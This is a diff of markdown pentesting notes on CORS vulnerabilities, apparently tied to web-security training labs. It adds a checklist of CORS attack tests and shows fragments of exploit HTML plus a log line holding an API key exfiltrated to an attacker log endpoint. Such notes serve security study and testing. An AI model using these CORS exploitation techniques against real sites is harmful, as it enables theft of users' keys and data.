@@ -1,5 +1,13 @@
 # Cross-origin resource sharing (CORS)
 
+## Tests 
+- [ ] Find Secret sharing API's
+- [ ] Whitelisted null origin value
+- [ ] * Origin 
+- [ ] Exploiting XSS via CORS trust relationships
+- [ ] Arbitrary subdomain on whitelisted Origin 
+- [ ] Intranets and CORS without credentials
+
 ## CORS vulnerability with basic origin reflection
 ```html
 <script>
@@ -33,7 +41,7 @@ Then read the API key from log:
 </script>'></iframe>
 ```
 Then read the API key from log:
-```
+``` 
 192.168.1.12    2019-11-26 21:43:49 +0000 "GET //log?key=FLgt9zxG64IV2d0DKYDm3pI2kRGtyY6g HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/885332"
 ```
 
